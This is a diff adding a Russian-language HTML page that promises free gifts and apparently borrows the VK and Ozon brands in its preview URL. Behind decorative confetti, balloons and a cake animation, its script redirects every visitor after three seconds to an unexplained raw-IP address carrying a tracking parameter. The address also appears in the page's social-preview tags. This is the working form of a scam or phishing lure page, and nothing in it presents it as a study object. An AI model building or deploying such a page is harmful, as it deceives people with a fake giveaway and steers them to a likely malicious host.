@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>Забери подарки прямо сейчас</title>
+
+<!-- Open Graph теги для превью -->
+<meta property="og:title" content="Забери подарки прямо сейчас">
+<meta property="og:description" content=".">
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
+<meta property="og:url" content="https://vk-ozon-podarki.github.io">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Забери подарки прямо сейчас">
+
+<!-- Twitter Card теги -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Забери подарки прямо сейчас">
+<meta name="twitter:description" content="https://192.253.248.4/?s=sCcUFzRVCt">
+<meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
+
+<style>
+body {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    font-family: 'Segoe UI', Arial, sans-serif;
+    min-height: 100vh;
+    margin: 0;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.card {
+    background: #fff;
+    border-radius: 20px;
+    padding: 40px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    max-width: 400px;
+    z-index: 10;
+}
+
+h1 {
+    color: #333;
+    font-size: 28px;
+    margin: 20px 0 10px;
+}
+
+p {
+    color: #666;
+    font-size: 16px;
+    margin: 10px 0 20px;
+}
+
+.progress {
+    background: #eee;
+    border-radius: 10px;
+    height: 8px;
+    overflow: hidden;
+    margin: 20px 0 10px;
+}
+
+.progress-bar {
+    background: linear-gradient(90deg, #667eea, #764ba2);
+    height: 100%;
+    width: 0;
+    transition: width 0.1s linear;
+}
+
+.timer {
+    color: #888;
+    font-size: 14px;
+}
+
+/* Конфетти */
+.confetti {
+    position: fixed;
+    top: -10px;
+    width: 10px;
+    height: 10px;
+    background: #ff6b6b;
+    animation: fall linear infinite;
+    z-index: 1;
+}
+
+.confetti:nth-child(1) { background: #ff6b6b; }
+.confetti:nth-child(2) { background: #4ecdc4; }
+.confetti:nth-child(3) { background: #ffe66d; }
+.confetti:nth-child(4) { background: #a8e6cf; }
+.confetti:nth-child(5) { background: #dda0dd; }
+.confetti:nth-child(6) { background: #ffb347; }
+.confetti:nth-child(7) { background: #87ceeb; }
+.confetti:nth-child(8) { background: #ff6b6b; }
+.confetti:nth-child(9) { background: #4ecdc4; }
+.confetti:nth-child(10) { background: #ffe66d; }
+
+@keyframes fall {
+    to {
+        transform: translateY(100vh) rotate(720deg);
+    }
+}
+
+/* Шарики */
+.balloon {
+    position: fixed;
+    bottom: -100px;
+    width: 40px;
+    height: 50px;
+    border-radius: 50%;
+    animation: float 8s ease-in infinite;
+    z-index: 1;
+}
+
+.balloon:nth-child(11) { left: 10%; background: #4ecdc4; animation-delay: 0s; }
+.balloon:nth-child(12) { left: 25%; background: #ffe66d; animation-delay: 1s; }
+.balloon:nth-child(13) { left: 40%; background: #ff6b6b; animation-delay: 2s; }
+.balloon:nth-child(14) { left: 55%; background: #a8e6cf; animation-delay: 3s; }
+.balloon:nth-child(15) { left: 70%; background: #dda0dd; animation-delay: 4s; }
+.balloon:nth-child(16) { left: 85%; background: #ffb347; animation-delay: 5s; }
+.balloon:nth-child(17) { left: 95%; background: #87ceeb; animation-delay: 6s; }
+
+@keyframes float {
+    to {
+        transform: translateY(-120vh);
+    }
+}
+
+/* Торт */
+.cake-wrapper {
+    margin: 20px auto;
+    width: 120px;
+}
+
+.cake {
+    position: relative;
+}
+
+.layer {
+    border-radius: 8px;
+    margin: 0 auto;
+}
+
+.layer-1 { width: 120px; height: 30px; background: #f4a460; }
+.layer-2 { width: 100px; height: 25px; background: #ffb6c1; }
+.layer-3 { width: 80px; height: 20px; background: #f4a460; }
+
+.frosting {
+    height: 8px;
+    background: #fff;
+    border-radius: 8px 8px 0 0;
+}
+
+.candles {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 5px;
+}
+
+.candle {
+    width: 6px;
+    height: 20px;
+    background: linear-gradient(to top, #ff6b6b 50%, #fff 50%);
+    border-radius: 2px;
+    position: relative;
+}
+
+.candle::after {
+    content: '';
+    position: absolute;
+    top: -8px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 6px;
+    height: 8px;
+    background: radial-gradient(circle, #ffd700, #ff6b6b);
+    border-radius: 50%;
+    animation: flicker 0.5s infinite alternate;
+}
+
+@keyframes flicker {
+    to {
+        transform: translateX(-50%) scale(1.2);
+        opacity: 0.8;
+    }
+}
+</style>
+</head>
+<body>
+
+<!-- Конфетти -->
+<div class="confetti" style="left: 5%;  animation-duration: 4.2s; animation-delay: 0s;"></div>
+<div class="confetti" style="left: 15%; animation-duration: 5.1s; animation-delay: 0.3s;"></div>
+<div class="confetti" style="left: 25%; animation-duration: 3.8s; animation-delay: 0.7s;"></div>
+<div class="confetti" style="left: 35%; animation-duration: 4.7s; animation-delay: 0.1s;"></div>
+<div class="confetti" style="left: 45%; animation-duration: 5.5s; animation-delay: 0.9s;"></div>
+<div class="confetti" style="left: 55%; animation-duration: 4.0s; animation-delay: 0.4s;"></div>
+<div class="confetti" style="left: 65%; animation-duration: 5.3s; animation-delay: 0.2s;"></div>
+<div class="confetti" style="left: 75%; animation-duration: 3.9s; animation-delay: 0.6s;"></div>
+<div class="confetti" style="left: 85%; animation-duration: 4.8s; animation-delay: 0.8s;"></div>
+<div class="confetti" style="left: 92%; animation-duration: 5.0s; animation-delay: 0.5s;"></div>
+
+<!-- Шарики -->
+<div class="balloon"></div>
+<div class="balloon"></div>
+<div class="balloon"></div>
+<div class="balloon"></div>
+<div class="balloon"></div>
+<div class="balloon"></div>
+<div class="balloon"></div>
+
+<!-- Карточка -->
+<div class="card">
+    <div class="cake-wrapper">
+        <div class="cake">
+            <div class="candles">
+                <div class="candle"></div>
+                <div class="candle"></div>
+                <div class="candle"></div>
+            </div>
+            <div class="layer layer-3"><div class="frosting"></div></div>
+            <div class="layer layer-2"><div class="frosting"></div></div>
+            <div class="layer layer-1"><div class="frosting"></div></div>
+        </div>
+    </div>
+
+    <h1>Забери подарки прямо сейчас</h1>
+    <p>Мы приготовили для тебя<br>что-то особенное...</p>
+
+    <div class="progress">
+        <div class="progress-bar" id="bar"></div>
+    </div>
+    <div class="timer" id="timer">Переход через 3 секунды...</div>
+</div>
+
+<script>
+    // ===== НАСТРОЙКИ =====
+    const REDIRECT_URL = "https://192.253.248.4/?s=sCcUFzRVCt";
+    const DELAY = 3000; // 3000 = 3 секунды
+
+    const bar = document.getElementById('bar');
+    const timer = document.getElementById('timer');
+    let timeLeft = DELAY / 1000;
+
+    const interval = setInterval(() => {
+        timeLeft -= 0.1;
+        const progress = ((DELAY / 1000 - timeLeft) / (DELAY / 1000)) * 100;
+        bar.style.width = Math.min(progress, 100) + '%';
+
+        if (timeLeft <= 0) {
+            clearInterval(interval);
+            timer.textContent = "Переходим...";
+        } else {
+            timer.textContent = `Переход через ${Math.ceil(timeLeft)} сек...`;
+        }
+    }, 100);
+
+    setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+    }, DELAY);
+</script>
+
+</body>
+</html>
